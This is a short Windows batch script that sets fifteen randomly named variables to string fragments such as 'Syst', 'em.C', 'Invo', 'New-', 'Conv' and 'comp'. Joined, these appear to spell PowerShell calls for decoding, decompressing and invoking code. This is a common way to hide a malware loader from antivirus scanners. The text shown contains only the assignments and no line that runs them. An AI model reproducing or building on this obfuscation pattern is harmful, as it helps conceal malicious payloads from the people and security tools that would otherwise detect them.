@echo off
set "XqTZLZvsfk=em.C"
set "zMpcPBhDNi=.-16"
set "koNvIfjdos=ach "
set "rRQWqkhUvd=rtS4"
set "nMNvdDaDrm=Syst"
set "CBXdilPMkM=Invo"
set "QXBusuXcvV=yste"
set "sjpOgqLumg=New-"
set "EBIjJxgWft=comp"
set "khnIPhvFNJ=nage"
set "boTIMmJSYf=Conv"
set "cgQDBQGwUL=tem."
set "yHqmqTMfbe=3); "
set "fEpUqtiiSX=and "
set "LXhvFJQMdR=V = "
